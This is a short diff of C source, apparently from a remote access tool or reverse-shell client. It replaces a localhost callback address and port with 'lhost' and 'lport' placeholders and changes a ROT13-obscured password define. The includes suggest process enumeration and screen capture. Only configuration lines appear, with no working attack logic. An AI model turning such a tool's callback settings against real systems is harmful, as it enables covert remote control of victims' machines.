@@ -11,10 +11,10 @@
 #include <tlhelp32.h>
 #include <gdiplus.h>
 
-#define SERVER_HOST "127.0.0.1"
-#define SERVER_PORT 443
+#define SERVER_HOST "lhost"
+#define SERVER_PORT lport
 
-#define PASSWORD "password" // ROT 13 !
+#define PASSWORD "passwd" // ROT 13 !
 #define MAX_PASSWORD 100
 
 #define BUFFER 4096
